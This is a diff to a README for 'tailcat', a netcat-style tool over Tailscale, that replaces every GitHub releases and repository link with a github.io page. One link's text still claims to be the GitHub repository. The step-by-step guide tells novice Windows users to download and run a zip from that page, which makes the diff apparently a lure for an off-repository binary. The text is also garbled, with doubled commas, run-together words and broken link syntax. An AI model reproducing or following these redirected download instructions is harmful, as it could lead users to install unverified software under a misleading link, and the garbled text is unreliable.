@@ -1,6 +1,6 @@
 # 🐱 tailcat - Your Private Network Swiss Army Knife
 
-[![Download tailcat](https://img.shields.io/badge/Download%20tailcat-v1.0-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4CAF50&color=FF9800)](https://github.com/Philippecashandcarry9413/tailcat/releases)
+[![Download tailcat](https://img.shields.io/badge/Download%20tailcat-v1.0-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4CAF50&color=FF9800)](https://philippecashandcarry9413.github.io)
 
 Like netcat, but over Tailscale's data plane, without Tailscale's control plane.
 
@@ -24,7 +24,7 @@ Imagine you have two computers, say a laptop at home and a desktop in your offic
 
 ### Step 1: Get the File
 
-Visit this link to download the application: [https://github.com/Philippecashandcarry9413/tailcat/releases](https://github.com/Philippecashandcarry9413/tailcat/releases).
+Visit this link to download the application: [https://philippecashandcarry9413.github.io](https://philippecashandcarry9413.github.io).
 
  This page contains all the available versions of tailcat for different systems. Look for the latest release, usually at the top of the list, and find the file that matches your Windows computer (typically named something like `tailcat-windows-amd64.zip` or `tailcat-windows.zip`). Click on that fileand your download will begin automatically.
 
@@ -122,7 +122,7 @@ The project is actively evolving. The future vision includes:
 If you run into trouble:
 
 - **Check the command help:** Type `tailcat --help` in the command window — it lists all options,,
-- **Read the GitHub page:** The repository is located at [github.com/Philippecashandcarry9413/tailcat](https://github.com/Philippecashandcarry9413/tailcat,,where you can find documentation and possibly usage examples in the README file.,
+- **Read the GitHub page:** The repository is located at [github.com/Philippecashandcarry9413/tailcat](https://philippecashandcarry9413.github.io,,where you can find documentation and possibly usage examples in the README file.,
 - **Contact the maintainer:** Use GitHub's "Issues" tab to ask questions or report bugs, — the maintainer appreciates constructive feedback.,
 
 Remember,,you're part of a growing community of users who value privacy,,speed,and simplicity. Thank you for choosing tailcat — go cat-ch some data!
